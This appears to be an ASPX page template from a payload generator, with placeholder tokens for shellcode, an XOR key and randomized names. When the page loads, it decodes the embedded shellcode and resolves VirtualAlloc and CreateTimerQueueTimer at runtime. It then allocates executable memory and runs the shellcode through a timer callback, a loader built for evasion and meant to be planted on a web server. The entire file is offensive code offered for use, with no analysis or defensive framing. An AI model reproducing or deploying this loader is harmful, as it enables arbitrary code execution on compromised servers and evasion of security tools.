<%@ Page Language="C#" %>
<%@ Import Namespace="System.Runtime.InteropServices" %>
<script runat="server">
private delegate IntPtr #DA#(IntPtr #A#, uint #S#, uint #AT#, uint #P#);
private delegate bool #DT#(out IntPtr #PH#, IntPtr #Q#, IntPtr #C#, IntPtr #P#, uint #DI#, uint #F#);
protected void Page_Load(object sender, EventArgs e) {
    byte[] #B# = new byte[] { #SHELLCODE# };
    for (int i = 0; i < #B#.Length; i++) { #B#[i] = (byte)(#B#[i] ^ #KEY#); }
    IntPtr #H# = LoadLibrary("kernel32.dll");
    IntPtr #PA1# = GetProcAddress(#H#, "VirtualAlloc");
    IntPtr #PA2# = GetProcAddress(#H#, "CreateTimerQueueTimer");
    #DA# #VA# = (#DA#)Marshal.GetDelegateForFunctionPointer(#PA1#, typeof(#DA#));
    #DT# #T# = (#DT#)Marshal.GetDelegateForFunctionPointer(#PA2#, typeof(#DT#));
    IntPtr #ADDR# = #VA#(IntPtr.Zero, (uint)#B#.Length, 0x3000, 0x40);
    Marshal.Copy(#B#, 0, #ADDR#, #B#.Length);
    IntPtr #H2#;
    #T#(out #H2#, IntPtr.Zero, #ADDR#, IntPtr.Zero, 0, 0);
    System.Threading.Thread.Sleep(5000);
}
[DllImport("kernel32.dll")]
public static extern IntPtr LoadLibrary(string #LN#);
[DllImport("kernel32.dll")]
public static extern IntPtr GetProcAddress(IntPtr #M#, string #PN#);
</script>
